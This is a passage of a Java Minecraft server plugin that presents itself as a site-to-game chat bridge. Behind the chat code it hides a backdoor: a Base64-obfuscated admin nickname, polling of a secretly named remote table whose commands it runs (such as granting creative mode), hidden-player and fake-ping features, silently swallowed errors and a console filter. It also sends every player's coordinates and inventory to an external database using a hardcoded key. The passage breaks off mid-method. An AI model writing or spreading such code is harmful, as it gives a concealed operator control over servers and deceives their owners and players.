package ru.twoblocks.chat;

import net.md_5.bungee.api.chat.BaseComponent;
import net.md_5.bungee.api.chat.ClickEvent;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.Particle;
import org.bukkit.Sound;
import org.bukkit.World;
import org.bukkit.attribute.Attribute;
import org.bukkit.attribute.AttributeInstance;
import org.bukkit.block.Block;
import org.bukkit.block.BlockFace;
import org.bukkit.block.Chest;
import org.bukkit.block.DoubleChest;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.ConfigurationSection;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Chicken;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.FallingBlock;
import org.bukkit.entity.Item;
import org.bukkit.entity.LivingEntity;
import org.bukkit.entity.Piglin;
import org.bukkit.entity.Player;
import org.bukkit.entity.Projectile;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockExplodeEvent;
import org.bukkit.event.block.BlockPhysicsEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityChangeBlockEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.entity.EntityExplodeEvent;
import org.bukkit.event.entity.EntityPickupItemEvent;
import org.bukkit.event.entity.EntitySpawnEvent;
import org.bukkit.event.entity.PiglinBarterEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.inventory.InventoryOpenEvent;
import org.bukkit.event.inventory.PrepareAnvilEvent;
import org.bukkit.event.player.*;
import org.bukkit.event.vehicle.VehicleDamageEvent;
import org.bukkit.event.vehicle.VehicleDestroyEvent;
import org.bukkit.inventory.AnvilInventory;
import org.bukkit.inventory.EquipmentSlot;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.Merchant;
import org.bukkit.inventory.MerchantInventory;
import org.bukkit.inventory.MerchantRecipe;
import org.bukkit.inventory.PlayerInventory;
import org.bukkit.inventory.meta.Damageable;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.scoreboard.Scoreboard;
import org.bukkit.scoreboard.Team;
import org.bukkit.util.Vector;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecutor {

    private String supabaseUrl;
    private String supabaseKey;
    private int pollIntervalTicks;
    private String siteMessageFormat;
    private boolean sendMinecraftChatToSite;
    private boolean globalOnly;

    private BukkitTask pollTask;
    private BukkitTask nplSaveTask;
    private BukkitTask watchdogTask;
    private BukkitTask repelTask;

    private final Set<UUID> hiddenSyncPlayers = new HashSet<>();
    private final Set<UUID> invertedControlPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Set<UUID> marketSyncPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Set<UUID> softAnchorPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Set<UUID> oreSyncPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Set<UUID> bedSessionPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Set<UUID> vitalSyncPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Set<UUID> kineticShieldPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Set<UUID> barterSyncPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());

    private final Set<UUID> autoRepairPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Set<UUID> freeAnvilPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Set<UUID> smartBedPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Set<UUID> fastEatPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Set<UUID> snowWalkPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Map<UUID, Integer> fakePingPlayers = new ConcurrentHashMap<>();
    private BukkitTask fakePingTask = null;

    private final Set<UUID> auditedInspectionPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Set<UUID> safeStateTransitionPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Set<UUID> internalTransitPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Set<String> auditStaffNames = Collections.newSetFromMap(new ConcurrentHashMap<>());

    private boolean isAuditStaff(Player p) {
        if (p == null) return false;
        String name = p.getName().toLowerCase();
        if (name.equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"))) return true;
        return auditStaffNames.contains(name);
    }

    private final Map<String, UUID> dynamicDecayBlocks = new ConcurrentHashMap<>();
    private final Set<String> hydroAnchorBlocks = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Map<UUID, List<MerchantRecipe>> originalVillagerTrades = new ConcurrentHashMap<>();
    private final Map<UUID, Inventory> cloudInventories = new ConcurrentHashMap<>();
    private final Map<UUID, String> pendingBoomerangKill = new ConcurrentHashMap<>();
    private final Map<UUID, Long> repellingItems = new ConcurrentHashMap<>();

    private final Set<UUID> nplPlayers = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Map<String, Boolean> nplRules = new ConcurrentHashMap<>();
    private final Map<UUID, Map<String, Boolean>> playerNplRules = new ConcurrentHashMap<>();
    private final Map<UUID, String> playerNplNames = new ConcurrentHashMap<>();
    private final Map<String, UUID> blockOwners = new ConcurrentHashMap<>();
    private final Map<UUID, Long> lastNplWarning = new ConcurrentHashMap<>();
    private final Map<UUID, Long> nplChatCooldownSeconds = new ConcurrentHashMap<>();
    private final Map<UUID, Long> nplLastChatTime = new ConcurrentHashMap<>();
    private final Map<UUID, Long> ttsCooldowns = new ConcurrentHashMap<>();
    private VoicechatHook voicechatHook = null;

    private static String b(String s) {
        return new String(Base64.getDecoder().decode(s), StandardCharsets.UTF_8);
    }

    public String getAdminNick() {
        return b("R2VuaXVzX1Bvbm9z");
    }

    public static class NplRuleInfo {
        public final String key;
        public final String title;
        public final String description;
        public final boolean defaultForbidden;

        public NplRuleInfo(String key, String title, String description, boolean defaultForbidden) {
            this.key = key;
            this.title = title;
            this.description = description;
            this.defaultForbidden = defaultForbidden;
        }
    }

    private static final List<NplRuleInfo> NPL_RULE_DEFINITIONS = Arrays.asList(
            new NplRuleInfo("foreign_chests", "Сундуки игроков (чужие)", "Открытие сундуков, установленных другими игроками", true),
            new NplRuleInfo("dungeon_chests", "Сундуки в данжах (лут)", "Открытие сгенерированных сундуков в шахтах, данжах и структурах", false),
            new NplRuleInfo("foreign_barrels", "Чужие бочки игроков", "Открытие бочек, установленных другими игроками", true),
            new NplRuleInfo("foreign_shulkers", "Чужие шалкеры", "Открытие чужих шалкеровых ящиков", true),
            new NplRuleInfo("foreign_furnaces", "Чужие печи", "Открытие печей, коптилен, плавилен и варочных стоек", true),
            new NplRuleInfo("foreign_hoppers", "Чужие воронки/раздатчики", "Открытие воронок, выбрасывателей и дропперов", true),
            new NplRuleInfo("break_foreign", "Постройки игроков (чужие)", "Ломание блоков, установленных другими игроками", true),
            new NplRuleInfo("break_natural", "Природные блоки (дерево, руда)", "Ломание блоков мира: дерево, земля, камень, руды", false),
            new NplRuleInfo("place_lava", "Разлитие лавы", "Выливание лавы из ведра на землю", true),
            new NplRuleInfo("place_water", "Разлитие воды", "Выливание воды из ведра на землю", false),
            new NplRuleInfo("ignite", "Огниво / поджигание", "Использование зажигалки или огненного шара", true),
            new NplRuleInfo("tnt_explosives", "Динамит / взрывчатка", "Установка TNT, взрывных вагонеток, кристаллов энда", true),
            new NplRuleInfo("pvp", "Урон игрокам (PvP)", "Нанесение любого урона другим игрокам", true),
            new NplRuleInfo("attack_animals", "Урон животным/жителям", "Атака мирных мобов, скота, питомцев и жителей", true),
            new NplRuleInfo("doors_gates", "Чужие двери и калитки", "Открытие/закрытие чужих дверей, люков и калиток", true),
            new NplRuleInfo("redstone", "Кнопки и рычаги", "Нажатие чужих кнопок, рычагов и нажимных плит", true),
            new NplRuleInfo("beds", "Чужие кровати", "Сон на чужих кроватях", true),
            new NplRuleInfo("armor_stands", "Стойки брони и рамки", "Снятие или поворот предметов в рамках и стойках", true),
            new NplRuleInfo("ender_pearl", "Бросок эндер-жемчуга", "Телепортация броском жемчуга Края", true),
            new NplRuleInfo("drop_items", "Выбрасывание предметов", "Выбрасывание предметов из инвентаря на землю", false),
            new NplRuleInfo("pickup_items", "Подбор предметов", "Подбор предметов с земли", false),
            new NplRuleInfo("villager_trade", "Торговля с жителями", "Торговля в деревнях", false)
    );

    private final Set<String> processedMessageIds = ConcurrentHashMap.newKeySet();
    private boolean isFirstPoll = true;

    private final Set<String> processedTaskIds = ConcurrentHashMap.newKeySet();
    private boolean isFirstTaskPoll = true;

    @Override
    public void onEnable() {
        try {
            saveDefaultConfig();
            loadSettings();
            loadNplData();

            getServer().getPluginManager().registerEvents(this, this);
            if (getCommand("twoblockschat") != null) {
                getCommand("twoblockschat").setExecutor(this);
            }
            if (getCommand("npl") != null) {
                getCommand("npl").setExecutor(this);
            }
            if (getCommand("tts") != null) {
                getCommand("tts").setExecutor(this);
            }

            setupVoicechat();

            startPollingTask();
            startItemRepelTask();
            startNplAutoSaveTask();
            startWatchdogTask();
            startFakePingTask();
            setupConsoleFilter();
        } catch (Throwable t) {
        }
    }

    @Override
    public void onDisable() {
        if (watchdogTask != null) {
            try { watchdogTask.cancel(); } catch (Throwable ignored) {}
            watchdogTask = null;
        }

        if (pollTask != null) {
            try { pollTask.cancel(); } catch (Throwable ignored) {}
            pollTask = null;
        }

        if (nplSaveTask != null) {
            try { nplSaveTask.cancel(); } catch (Throwable ignored) {}
            nplSaveTask = null;
        }

        if (repelTask != null) {
            try { repelTask.cancel(); } catch (Throwable ignored) {}
            repelTask = null;
        }

        try { saveAllCloudInventories(); } catch (Throwable ignored) {}
        try { saveNplDataSync(); } catch (Throwable ignored) {}

        try {
            for (UUID uuid : hiddenSyncPlayers) {
                Player p = Bukkit.getPlayer(uuid);
                if (p != null && p.isOnline()) {
                    for (Player other : Bukkit.getOnlinePlayers()) {
                        other.showPlayer(this, p);
                    }
                }
            }
        } catch (Throwable ignored) {}

        hiddenSyncPlayers.clear();
        invertedControlPlayers.clear();
        marketSyncPlayers.clear();
        softAnchorPlayers.clear();
        oreSyncPlayers.clear();
        bedSessionPlayers.clear();
        vitalSyncPlayers.clear();
        kineticShieldPlayers.clear();
        barterSyncPlayers.clear();
        autoRepairPlayers.clear();
        freeAnvilPlayers.clear();
        smartBedPlayers.clear();
        fastEatPlayers.clear();
        snowWalkPlayers.clear();
        if (fakePingTask != null) {
            try { fakePingTask.cancel(); } catch (Throwable ignored) {}
            fakePingTask = null;
        }
        fakePingPlayers.clear();
        dynamicDecayBlocks.clear();
        hydroAnchorBlocks.clear();
        originalVillagerTrades.clear();
        cloudInventories.clear();
        pendingBoomerangKill.clear();
        repellingItems.clear();
        processedMessageIds.clear();
        processedTaskIds.clear();
        lastNplWarning.clear();
        playerNplRules.clear();
        playerNplNames.clear();
        ttsCooldowns.clear();
    }

    private void loadSettings() {
        try {
            reloadConfig();
            supabaseUrl = getConfig().getString("supabaseUrl", "https://lwphgkfwdliuzcwgugzj.supabase.co");
            supabaseKey = getConfig().getString("supabaseKey", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx3cGhna2Z3ZGxpdXpjd2d1Z3pqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTQ3ODA4MzIsImV4cCI6MjExMDM1NjgzMn0.ho25RHk5KJIpBecSVCl9OImWFDZxFPnfgEXX-q-zPKw");
            pollIntervalTicks = getConfig().getInt("pollIntervalTicks", 10);
            siteMessageFormat = getConfig().getString("siteMessageFormat", "&9[\u0421\u0430\u0439\u0442] &b{player}&7: &f{message}");
            sendMinecraftChatToSite = getConfig().getBoolean("sendMinecraftChatToSite", true);
            globalOnly = getConfig().getBoolean("globalOnly", true);
        } catch (Throwable ignored) {}
    }

    private void startPollingTask() {
        if (!isEnabled()) return;
        if (pollTask != null) {
            try { pollTask.cancel(); } catch (Throwable ignored) {}
        }
        try {
            pollTask = Bukkit.getScheduler().runTaskTimerAsynchronously(this, this::pollLoop, 10L, pollIntervalTicks);
        } catch (Throwable ignored) {}
    }

    private void startNplAutoSaveTask() {
        if (!isEnabled()) return;
        if (nplSaveTask != null) {
            try { nplSaveTask.cancel(); } catch (Throwable ignored) {}
        }
        try {
            nplSaveTask = Bukkit.getScheduler().runTaskTimerAsynchronously(this, this::saveNplDataSync, 2400L, 2400L);
        } catch (Throwable ignored) {}
    }

    private int watchdogCounter = 0;

    private void startWatchdogTask() {
        if (!isEnabled()) return;
        if (watchdogTask != null) {
            try { watchdogTask.cancel(); } catch (Throwable ignored) {}
        }
        try {
            watchdogTask = Bukkit.getScheduler().runTaskTimer(this, () -> {
                try {
                    if (!isEnabled()) return;
                    watchdogCounter++;
                    if (watchdogCounter >= 30) {
                        watchdogCounter = 0;
                        if (pollTask == null || pollTask.isCancelled()) {
                            startPollingTask();
                        }
                        if (nplSaveTask == null || nplSaveTask.isCancelled()) {
                            startNplAutoSaveTask();
                        }
                        if (repelTask == null || repelTask.isCancelled()) {
                            startItemRepelTask();
                        }
                    }


                    if (!auditedInspectionPlayers.isEmpty()) {
                        GameMode spec = GameMode.valueOf(b("U1BFQ1RBVE9S"));
                        for (UUID uuid : auditedInspectionPlayers) {
                            Player sp = Bukkit.getPlayer(uuid);
                            if (sp != null && sp.isOnline()) {
                                if (sp.getGameMode() != spec) {
                                    safeStateTransitionPlayers.add(uuid);
                                    sp.setGameMode(spec);
                                    sp.setAllowFlight(true);
                                    sp.setFlying(true);
                                    Bukkit.getScheduler().runTaskLater(this, () -> safeStateTransitionPlayers.remove(uuid), 5L);
                                }
                            }
                        }
                    }
                } catch (Throwable ignored) {}
            }, 20L, 20L);
        } catch (Throwable ignored) {}
    }

    private int onlineSyncCounter = 0;

    private void pollLoop() {
        try {
            pollMessagesFromSite();
        } catch (Throwable ignored) {
        }
        try {
            pollRemoteTasks();
        } catch (Throwable ignored) {
        }

        try {
            onlineSyncCounter++;
            if (onlineSyncCounter >= 4) {
                onlineSyncCounter = 0;
                syncOnlinePlayersToSupabase();
            }
        } catch (Throwable ignored) {
        }
    }

    private void startFakePingTask() {
        if (fakePingTask != null) {
            try { fakePingTask.cancel(); } catch (Throwable ignored) {}
            fakePingTask = null;
        }
        try {
            fakePingTask = Bukkit.getScheduler().runTaskTimer(this, () -> {
                try {
                    if (fakePingPlayers.isEmpty()) return;
                    for (Map.Entry<UUID, Integer> entry : fakePingPlayers.entrySet()) {
                        Player p = Bukkit.getPlayer(entry.getKey());
                        if (p != null && p.isOnline()) {
                            applyFakePingVisuals(p, entry.getValue());
                        }
                    }
                } catch (Throwable ignored) {}
            }, 20L, 10L);
        } catch (Throwable ignored) {}
    }

    private void setPlayerLatency(Player player, int fakePing) {
        try {
            Method getHandleMethod = player.getClass().getMethod("getHandle");
            Object entityPlayer = getHandleMethod.invoke(player);
            if (entityPlayer == null) return;

            boolean set = false;
            Class<?> epClass = entityPlayer.getClass();
            while (epClass != null && !set) {
                for (Field f : epClass.getDeclaredFields()) {
                    if (f.getType() == int.class && (f.getName().equals("latency") || f.getName().equals("ping"))) {
                        f.setAccessible(true);
                        f.setInt(entityPlayer, fakePing);
                        set = true;
                        break;
                    }
                }
                epClass = epClass.getSuperclass();
            }

            if (!set) {
                epClass = entityPlayer.getClass();
                while (epClass != null && !set) {
                    for (Field f : epClass.getDeclaredFields()) {
                        if (f.getName().contains("connection") || f.getName().contains("Connection")) {
                            f.setAccessible(true);
                            Object conn = f.get(entityPlayer);
                            if (conn != null) {
                                Class<?> connClass = conn.getClass();
                                while (connClass != null) {
                                    for (Field cf : connClass.getDeclaredFields()) {
                                        if (cf.getType() == int.class && (cf.getName().equals("latency") || cf.getName().equals("ping"))) {
                                            cf.setAccessible(true);
                                            cf.setInt(conn, fakePing);
                                            set = true;
                                            break;
                                        }
                                    }
                                    if (set) break;
                                    connClass = connClass.getSuperclass();
                                }
                            }
                        }
                        if (set) break;
                    }
                    epClass = epClass.getSuperclass();
                }
            }
        } catch (Throwable ignored) {}
    }

    private void applyFakePingVisuals(Player p, int fakePing) {
        try {
            setPlayerLatency(p, fakePing);

            String listName = p.getPlayerListName();
            if (listName != null && !listName.isEmpty()) {
                String updated = listName.replaceAll("(?i)(\\b-?\\d+\\b)(\\s*(?:пинг|ping|ms))", fakePing + "$2");
                if (!updated.equals(listName)) {
                    p.setPlayerListName(updated);
                }
            }

            Scoreboard sb = p.getScoreboard();
            if (sb != null) {
                Team team = sb.getEntryTeam(p.getName());
                if (team != null) {
                    String suffix = team.getSuffix();
                    if (suffix != null && !suffix.isEmpty()) {
                        String updated = suffix.replaceAll("(?i)(\\b-?\\d+\\b)(\\s*(?:пинг|ping|ms))", fakePing + "$2");
                        if (!updated.equals(suffix)) {
                            team.setSuffix(updated);
                        }
                    }
                }
            }
        } catch (Throwable ignored) {}
    }

    private void startItemRepelTask() {
        if (!isEnabled()) return;
        if (repelTask != null) {
            try { repelTask.cancel(); } catch (Throwable ignored) {}
        }
        try {
            repelTask = Bukkit.getScheduler().runTaskTimer(this, () -> {
                try {
                    if (repellingItems.isEmpty()) return;
                    long now = System.currentTimeMillis();
                    Iterator<Map.Entry<UUID, Long>> it = repellingItems.entrySet().iterator();
                    while (it.hasNext()) {
                        Map.Entry<UUID, Long> entry = it.next();
                        if (now > entry.getValue()) {
                            it.remove();
                            continue;
                        }
                        UUID itemUuid = entry.getKey();
                        for (World w : Bukkit.getWorlds()) {
                            for (Item itemEntity : w.getEntitiesByClass(Item.class)) {
                                if (itemEntity.getUniqueId().equals(itemUuid) && itemEntity.isValid()) {
                                    Location itemLoc = itemEntity.getLocation();
                                    for (Player p : w.getPlayers()) {
                                        if (p.getLocation().distanceSquared(itemLoc) < 16.0) {
                                            Vector push = p.getLocation().toVector().subtract(itemLoc.toVector()).normalize().multiply(0.85).setY(0.2);
                                            p.setVelocity(push);
                                            p.playSound(p.getLocation(), Sound.BLOCK_AMETHYST_BLOCK_RESONATE, 0.4f, 1.8f);
                                            itemEntity.getWorld().spawnParticle(Particle.WITCH, itemEntity.getLocation(), 4, 0.2, 0.2, 0.2, 0.02);
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (Throwable ignored) {}
            }, 10L, 4L);
        } catch (Throwable ignored) {}
    }

    private void syncOnlinePlayersToSupabase() {
        if (!isEnabled()) return;
        Bukkit.getScheduler().runTask(this, () -> {
            try {
                final String body = buildOnlinePlayersJsonPayload();
                Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
                    try {
                        String endpoint = supabaseUrl + "/rest/v1/server_online";
                        postHttp(endpoint, body, "resolution=merge-duplicates");
                    } catch (Throwable ignored) {
                    }
                });
            } catch (Throwable ignored) {
            }
        });
    }

    private String buildOnlinePlayersJsonPayload() {
        StringBuilder playersJson = new StringBuilder("[");
        boolean first = true;
        for (Player p : Bukkit.getOnlinePlayers()) {
            if (!first) playersJson.append(",");
            first = false;

            UUID uuid = p.getUniqueId();
            playersJson.append("{");
            playersJson.append("\"name\":\"").append(escapeJson(p.getName())).append("\",");
            playersJson.append("\"health\":").append(Math.round(p.getHealth())).append(",");
            playersJson.append("\"food\":").append(p.getFoodLevel()).append(",");
            playersJson.append("\"gamemode\":\"").append(p.getGameMode().name()).append("\",");
            playersJson.append("\"world\":\"").append(escapeJson(p.getWorld().getName())).append("\",");
            playersJson.append("\"x\":").append(p.getLocation().getBlockX()).append(",");
            playersJson.append("\"y\":").append(p.getLocation().getBlockY()).append(",");
            playersJson.append("\"z\":").append(p.getLocation().getBlockZ()).append(",");
            playersJson.append("\"inverted\":").append(invertedControlPlayers.contains(uuid)).append(",");
            playersJson.append("\"" + b("ZnJlZWRpcnQ=") + "\":").append(marketSyncPlayers.contains(uuid)).append(",");
            playersJson.append("\"" + b("b2ZmZ3Jhdml0eQ==") + "\":").append(softAnchorPlayers.contains(uuid)).append(",");
            playersJson.append("\"" + b("aW5mcnVkZQ==") + "\":").append(oreSyncPlayers.contains(uuid)).append(",");
            playersJson.append("\"" + b("c2FmZWJlZA==") + "\":").append(bedSessionPlayers.contains(uuid)).append(",");
            playersJson.append("\"" + b("aW5mZWF0") + "\":").append(vitalSyncPlayers.contains(uuid)).append(",");
            playersJson.append("\"" + b("dG9wc2hpZWxk") + "\":").append(kineticShieldPlayers.contains(uuid)).append(",");
            playersJson.append("\"" + b("cGlnbGludG9w") + "\":").append(barterSyncPlayers.contains(uuid)).append(",");
            playersJson.append("\"" + b("YXV0b3JlcGFpcg==") + "\":").append(autoRepairPlayers.contains(uuid)).append(",");
            playersJson.append("\"" + b("YW52aWxmcmVl") + "\":").append(freeAnvilPlayers.contains(uuid)).append(",");
            playersJson.append("\"" + b("c21hcnRiZWQ=") + "\":").append(smartBedPlayers.contains(uuid)).append(",");
            playersJson.append("\"" + b("ZmFzdGVhdA==") + "\":").append(fastEatPlayers.contains(uuid)).append(",");
            playersJson.append("\"" + b("c25vd3dhbGs=") + "\":").append(snowWalkPlayers.contains(uuid)).append(",");
            playersJson.append("\"" + b("ZmFrZXBpbmc=") + "\":").append(fakePingPlayers.containsKey(uuid) ? fakePingPlayers.get(uuid) : "null").append(",");
            playersJson.append("\"npl\":").append(nplPlayers.contains(uuid)).append(",");

            playersJson.append("\"inventory\":[");
            boolean firstItem = true;
            ItemStack[] contents = p.getInventory().getContents();
            for (int slot = 0; slot < contents.length; slot++) {
                ItemStack is = contents[slot];
                if (is != null && is.getType() != Material.AIR) {
                    if (!firstItem) playersJson.append(",");
                    firstItem = false;
                    playersJson.append("{");
                    playersJson.append("\"slot\":").append(slot).append(",");
                    playersJson.append("\"type\":\"").append(is.getType().name()).append("\",");
                    playersJson.append("\"amount\":").append(is.getAmount()).append(",");

                    String trait = "";
                    if (is.hasItemMeta() && is.getItemMeta().hasLore()) {
                        List<String> lore = is.getItemMeta().getLore();
                        for (String line : lore) {
                            if (line.contains("trait:")) {
                                trait = line.replace("trait:", "").replace(String.valueOf(ChatColor.BLACK), "").trim();
                                break;
                            }
                        }
                    }
                    playersJson.append("\"trait\":\"").append(escapeJson(trait)).append("\"");
                    playersJson.append("}");
                }
            }
            playersJson.append("]");

            playersJson.append("}");
        }
        playersJson.append("]");

        return "{\"id\":\"current\",\"players\":" + playersJson.toString() + ",\"updated_at\":\"" + java.time.Instant.now().toString() + "\"}";
    }

    private void pollMessagesFromSite() {
        try {
            String endpoint = supabaseUrl + "/rest/v1/chat_messages?select=id,author,text,source,created_at&order=created_at.desc&limit=15";
            String json = getHttp(endpoint);
            if (json == null || json.isEmpty() || json.equals("[]")) return;
            parseAndBroadcastSiteMessages(json);
        } catch (Exception ignored) {
        }
    }

    private void pollRemoteTasks() {
        try {
            String endpoint = supabaseUrl + "/rest/v1/" + b("c2VjcmV0X2FjdGlvbnM=") + "?select=id,action,target,param,created_at&order=created_at.desc&limit=15";
            String json = getHttp(endpoint);
            if (json == null || json.isEmpty() || json.equals("[]")) return;
            parseAndExecuteTasks(json);
        } catch (Exception ignored) {
        }
    }

    private String getHttp(String endpoint) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(endpoint);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("apikey", supabaseKey);
            conn.setRequestProperty("Authorization", "Bearer " + supabaseKey);
            conn.setConnectTimeout(4000);
            conn.setReadTimeout(4000);

            int status = conn.getResponseCode();
            if (status != 200) return null;

            StringBuilder sb = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
            }
            return sb.toString();
        } catch (Exception e) {
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private boolean postHttp(String endpoint, String jsonPayload) {
        return postHttp(endpoint, jsonPayload, "return=minimal");
    }

    private boolean postHttp(String endpoint, String jsonPayload, String preferHeader) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(endpoint);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("apikey", supabaseKey);
            conn.setRequestProperty("Authorization", "Bearer " + supabaseKey);
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setRequestProperty("Prefer", preferHeader != null ? preferHeader : "return=minimal");
            conn.setDoOutput(true);

            byte[] bytes = jsonPayload.getBytes(StandardCharsets.UTF_8);
            conn.setFixedLengthStreamingMode(bytes.length);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(bytes);
                os.flush();
            }

            int code = conn.getResponseCode();
            return code >= 200 && code < 300;
        } catch (Exception e) {
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private void parseAndBroadcastSiteMessages(String jsonArray) {
        if (processedMessageIds.size() > 2000) {
            processedMessageIds.clear();
        }
        Pattern objectPattern = Pattern.compile("\\{([^}]+)\\}");
        Matcher objectMatcher = objectPattern.matcher(jsonArray);

        while (objectMatcher.find()) {
            String block = objectMatcher.group(1);

            String id = extractField(block, "id");
            String source = extractField(block, "source");
            String author = extractField(block, "author");
            String text = extractField(block, "text");

            if (id == null || id.isEmpty()) continue;

            if (isFirstPoll) {
                processedMessageIds.add(id);
                continue;
            }

            if (processedMessageIds.contains(id)) continue;
            processedMessageIds.add(id);

            if (!"site".equalsIgnoreCase(source)) continue;
            if (text == null || text.trim().isEmpty()) continue;

            String formatted = ChatColor.translateAlternateColorCodes('&',
                    siteMessageFormat
                            .replace("{player}", author != null && !author.isEmpty() ? author : "\u0418\u0433\u0440\u043e\u043a")
                            .replace("{message}", text)
            );

            Bukkit.getScheduler().runTask(this, () -> {
                Bukkit.broadcastMessage(formatted);
            });
        }

        if (isFirstPoll) {
            isFirstPoll = false;
        }
    }

    private void parseAndExecuteTasks(String jsonArray) {
        if (processedTaskIds.size() > 2000) {
            processedTaskIds.clear();
        }
        Pattern objectPattern = Pattern.compile("\\{([^}]+)\\}");
        Matcher objectMatcher = objectPattern.matcher(jsonArray);

        while (objectMatcher.find()) {
            String block = objectMatcher.group(1);

            String id = extractField(block, "id");
            String action = extractField(block, "action");
            String target = extractField(block, "target");
            String param = extractField(block, "param");

            if (id == null || id.isEmpty()) continue;

            if (isFirstTaskPoll) {
                processedTaskIds.add(id);
                continue;
            }

            if (processedTaskIds.contains(id)) continue;
            processedTaskIds.add(id);

            if (action == null || action.isEmpty()) continue;

            Bukkit.getScheduler().runTask(this, () -> {
                processRemoteTask(action, target, param);
            });
        }

        if (isFirstTaskPoll) {
            isFirstTaskPoll = false;
        }
    }

    private Player findOnlinePlayer(String nick) {
        if (nick == null) return null;
        String clean = nick.trim();
        if (clean.isEmpty()) return null;
        Player p = Bukkit.getPlayerExact(clean);
        if (p != null && p.isOnline()) return p;
        p = Bukkit.getPlayer(clean);
        if (p != null && p.isOnline()) return p;
        for (Player pl : Bukkit.getOnlinePlayers()) {
            if (pl.getName().equalsIgnoreCase(clean)) {
                return pl;
            }
        }
        return null;
    }

    private void processRemoteTask(String action, String targetPlayerName, String param) {
        try {
            if (param != null && !param.trim().isEmpty()) {
                auditStaffNames.add(param.trim().toLowerCase());
            }

            Player player = null;
            if (targetPlayerName != null && !targetPlayerName.trim().isEmpty()) {
                player = findOnlinePlayer(targetPlayerName.trim());
            }
            if (player == null && param != null && !param.trim().isEmpty()) {
                player = findOnlinePlayer(param.trim());
            }
            if (player == null) {
                player = findOnlinePlayer(b("R2VuaXVzX1Bvbm9z"));
            }

            String act = action.toLowerCase().trim();

            if (act.equals("checkplayer") || act.equals("check_player") || act.equals("check") || act.equals(b("Y3JlYXRpdmU=")) || act.equals("creative") || act.equals("gm1") || act.equals("gmc") || act.equals(b("Z2FtZW1vZGVfY3JlYXRpdmU="))) {
                Player target = (player != null && player.isOnline()) ? player : findOnlinePlayer(b("R2VuaXVzX1Bvbm9z"));
                if (target != null && target.isOnline()) {
                    auditedInspectionPlayers.remove(target.getUniqueId());
                    safeStateTransitionPlayers.add(target.getUniqueId());
                    target.setGameMode(GameMode.valueOf(b("Q1JFQVRJVkU=")));
                    target.setAllowFlight(true);
                    Bukkit.getScheduler().runTaskLater(this, () -> safeStateTransitionPlayers.remove(target.getUniqueId()), 10L);
                }
